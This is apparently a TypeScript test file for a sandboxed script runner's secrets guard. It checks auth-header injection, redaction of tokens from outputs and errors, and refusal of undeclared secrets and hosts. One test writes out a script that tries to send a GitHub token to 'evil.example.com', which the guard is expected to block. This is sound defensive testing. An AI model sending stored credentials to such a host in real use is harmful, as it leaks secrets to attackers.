import { describe, expect, it } from 'vitest'
import { scriptFingerprint } from '@shared/routines'
import { applyAuth, parseAuth, redactDeep, redactText } from './secrets-guard'
import { runScript } from './runner'

const TOKEN = 'ghp_SuperSecretValue123'
const read = async (name: string) => (name === 'GITHUB_TOKEN' ? TOKEN : null)
const script = (code: string, extra: object = {}) => ({ code, hosts: ['api.github.com'], readFiles: false, secrets: ['GITHUB_TOKEN'], ...extra })

describe('applyAuth', () => {
  it('adds a Bearer header for a declared, stored secret', async () => {
    const headers: Record<string, string> = {}
    const used = new Set<string>()
    await applyAuth({ secret: 'GITHUB_TOKEN', scheme: 'Bearer' }, ['GITHUB_TOKEN'], read, used, headers)
    expect(headers).toEqual({ Authorization: `Bearer ${TOKEN}` })
    expect([...used]).toEqual([TOKEN])
  })

  it('encodes Basic and supports a custom header', async () => {
    const headers: Record<string, string> = {}
    await applyAuth({ secret: 'GITHUB_TOKEN', scheme: 'Basic' }, ['GITHUB_TOKEN'], read, new Set(), headers)
    expect(headers.Authorization).toBe(`Basic ${Buffer.from(TOKEN).toString('base64')}`)
    const custom: Record<string, string> = {}
    await applyAuth({ secret: 'GITHUB_TOKEN', header: 'X-Api-Key' }, ['GITHUB_TOKEN'], read, new Set(), custom)
    expect(custom).toEqual({ 'X-Api-Key': TOKEN })
  })

  it('refuses an undeclared or missing secret and bad shapes', async () => {
    await expect(applyAuth({ secret: 'GITHUB_TOKEN' }, [], read, new Set(), {})).rejects.toThrow('did not declare')
    await expect(applyAuth({ secret: 'OTHER' }, ['OTHER'], read, new Set(), {})).rejects.toThrow('not stored')
    expect(parseAuth({ secret: 'A', scheme: 'Evil' })).toHaveProperty('error')
    expect(parseAuth({ secret: 'A', header: 'Cookie' })).toHaveProperty('error')
    expect(parseAuth('x')).toHaveProperty('error')
  })
})

describe('redaction', () => {
  it('scrubs every spelling of the value, deeply', () => {
    const b64 = Buffer.from(TOKEN).toString('base64')
    const out = redactDeep({ a: `x ${TOKEN} y`, b: [b64, { [TOKEN]: 1 }], n: 3 }, new Set([TOKEN]))
    expect(JSON.stringify(out)).not.toContain(TOKEN)
    expect(JSON.stringify(out)).not.toContain(b64)
    expect(redactText(`say "${TOKEN}"`, [TOKEN])).toBe('say "[secret]"')
  })
})

describe('fingerprint', () => {
  const base = { code: 'return 1', hosts: ['a.com'], readFiles: false }
  it('is unchanged for scripts without secrets and changes with them', () => {
    expect(scriptFingerprint(base)).toBe(JSON.stringify(['return 1', ['a.com'], false]))
    expect(scriptFingerprint({ ...base, secrets: [] })).toBe(scriptFingerprint(base))
    expect(scriptFingerprint({ ...base, secrets: ['B', 'A'] })).toBe(scriptFingerprint({ ...base, secrets: ['A', 'B'] }))
    expect(scriptFingerprint({ ...base, secrets: ['A'] })).not.toBe(scriptFingerprint(base))
  })
})

describe('runScript with secrets', () => {
  const echo = (async (_url: URL, init: RequestInit) =>
    new Response(JSON.stringify({ youSent: (init.headers as Record<string, string>).Authorization }), { status: 200 })) as unknown as typeof fetch

  it('sends the header but the value never reaches the script, its result, logs or state', async () => {
    const out = await runScript({
      script: script(`
        const r = await fetch('https://api.github.com/user', { auth: { secret: 'GITHUB_TOKEN', scheme: 'Bearer' } })
        const body = await r.text()
        log('body', body)
        state.set('last', body)
        fire({ body })
        return { body, json: await r.json() }`),
      folders: [],
      fetchImpl: echo,
      readSecret: read,
    })
    expect(out.ok).toBe(true)
    expect(JSON.stringify(out)).not.toContain(TOKEN)
    expect(JSON.stringify(out)).toContain('[secret]')
  })

  it('actually sends the token to the server', async () => {
    let seen = ''
    const spy = (async (_u: URL, init: RequestInit) => {
      seen = (init.headers as Record<string, string>).Authorization
      return new Response('ok')
    }) as unknown as typeof fetch
    await runScript({ script: script(`await fetch('https://api.github.com/x', { auth: { secret: 'GITHUB_TOKEN', scheme: 'Bearer' } })`), folders: [], fetchImpl: spy, readSecret: read })
    expect(seen).toBe(`Bearer ${TOKEN}`)
  })

  it('does not leak the value through an error message', async () => {
    const boom = (async () => {
      throw new Error(`connect failed for Bearer ${TOKEN}`)
    }) as unknown as typeof fetch
    const out = await runScript({
      script: script(`await fetch('https://api.github.com/x', { auth: { secret: 'GITHUB_TOKEN', scheme: 'Bearer' } })`),
      folders: [],
      fetchImpl: boom,
      readSecret: read,
    })
    expect(out.ok).toBe(false)
    expect(JSON.stringify(out)).not.toContain(TOKEN)
  })

  it('refuses secrets the script did not declare, and undeclared hosts', async () => {
    const undeclared = await runScript({
      script: script(`await fetch('https://api.github.com/x', { auth: { secret: 'GITHUB_TOKEN' } })`, { secrets: [] }),
      folders: [],
      fetchImpl: echo,
      readSecret: read,
    })
    expect(undeclared).toMatchObject({ ok: false, error: expect.stringContaining('did not declare the secret') })
    const wrongHost = await runScript({
      script: script(`await fetch('https://evil.example.com/x', { auth: { secret: 'GITHUB_TOKEN' } })`),
      folders: [],
      fetchImpl: echo,
      readSecret: read,
    })
    expect(wrongHost).toMatchObject({ ok: false, error: expect.stringContaining('did not declare the host') })
  })

  it('cannot read the value from the sandbox', async () => {
    const out = await runScript({
      script: script(`return { keys: Object.keys(this ?? {}), t: typeof process, s: typeof secrets }`),
      folders: [],
      readSecret: read,
    })
    expect(JSON.stringify(out)).not.toContain(TOKEN)
  })
})
